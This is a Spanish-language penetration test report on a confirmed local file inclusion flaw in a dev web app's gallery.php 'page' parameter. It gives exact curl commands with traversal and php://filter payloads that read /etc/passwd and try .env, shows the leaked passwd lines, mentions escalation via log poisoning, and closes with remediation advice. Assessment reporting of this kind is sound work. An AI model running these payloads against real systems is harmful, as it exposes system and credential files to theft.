# Informe de análisis LFI — 2026-04-18T08:37:49

Resumen ejecutivo
-----------------
Objetivo: http://web.dev.local:8081
Resultado: Vulnerabilidad LFI confirmada y explotada para leer ficheros del sistema.

Estados
-------
- VULN_FOUND: true
- VULN_EXPLOITED: true

Detalles técnicos
-----------------
1) Puntos de entrada identificados
- Parámetro GET: gallery.php?page

2) Comandos y pruebas realizadas (exactos)
- curl -s -D /tmp/headers.txt http://web.dev.local:8081 -o /tmp/root.html
- mkdir -p /tmp/lfi_test
- curl -s "http://web.dev.local:8081/gallery.php?page=modern" -o /tmp/lfi_test/normal.html
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../../../etc/passwd" -o /tmp/lfi_test/etc_passwd.html
- curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/passwd" -o /tmp/lfi_test/etc_passwd_b64.html
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../../../etc/hosts" -o /tmp/lfi_test/etc_hosts.html
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../../../var/www/html/.env" -o /tmp/lfi_test/env.html

3) Payloads que confirmaron LFI
- Traversal simple: ../../../../../../../../etc/passwd
- Wrapper PHP base64: php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/passwd

4) Evidencia (fragmentos)
- Contenido extraído desde /etc/passwd (capturado en la respuesta HTML):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- Variante php://filter devolvió base64 que decodifica a /etc/passwd, lo que evidencia lectura de fichero en crudo.

5) Intentos adicionales
- Solicitado /var/www/html/.env y /etc/hosts (no se obtuvo contenido sensible en estas pruebas o estaban ausentes), pero la presencia de /etc/passwd ya confirma LFI funcional.

Explotación y riesgo
--------------------
- Se logró leer /etc/passwd: confirma acceso a ficheros arbitrarios dentro del sistema de archivos mediante traversal.
- Impacto: divulgación de cuentas del sistema (usuarios del sistema y rutas home). Con técnicas adicionales (por ejemplo, lectura de /etc/shadow si permisos lo permitieran, o log poisoning para RCE) se podría escalar a compromisos mayores.

Recomendaciones
---------------
1. Validación estricta de parámetros: restringir valores permitidos para "page" a una lista blanca (modern, classic, abstract, about).
2. Evitar inclusion dinámica de ficheros directamente desde input; usar mapeo servidor-lado o rutas internas.
3. Desactivar wrappers como php://filter para inclusión de ficheros si no son necesarios.
4. Revisar permisos de ficheros sensibles y minimizar lectura por el usuario del proceso web.

Anexos
------
- Archivos de captura guardados en /tmp/lfi_test/ (etc_passwd.html, etc_passwd_b64.html, ...)
- Comandos reproducibles incluidos en la sección de comandos.

Fin del informe.
